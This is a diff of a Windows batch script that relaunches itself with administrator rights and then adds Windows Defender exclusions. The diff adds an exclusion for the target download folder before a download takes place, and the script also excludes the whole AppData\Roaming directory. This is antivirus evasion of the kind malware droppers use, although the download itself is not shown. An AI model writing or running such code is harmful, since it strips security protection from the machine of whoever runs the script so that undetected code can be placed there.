@@ -1,8 +1,5 @@
 @echo off
 :: Elevate to admin if not already running with it
-:: Uses a simple method that relaunches the script with admin privileges only once
-
-:: Check for admin access
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
     powershell -Command "Start-Process '%~f0' -Verb runAs"
@@ -19,7 +16,10 @@ if not exist "%TARGET_DIR%" (
     mkdir "%TARGET_DIR%"
 )
 
-:: Add exclusion for the entire AppData\Roaming folder
+:: Add exclusion for the download location BEFORE download
+powershell -Command "Add-MpPreference -ExclusionPath '%TARGET_DIR%'"
+
+:: Optionally exclude the entire AppData\Roaming dir too
 powershell -Command "Add-MpPreference -ExclusionPath '%APPDATA%'"
 
 :: Clean output
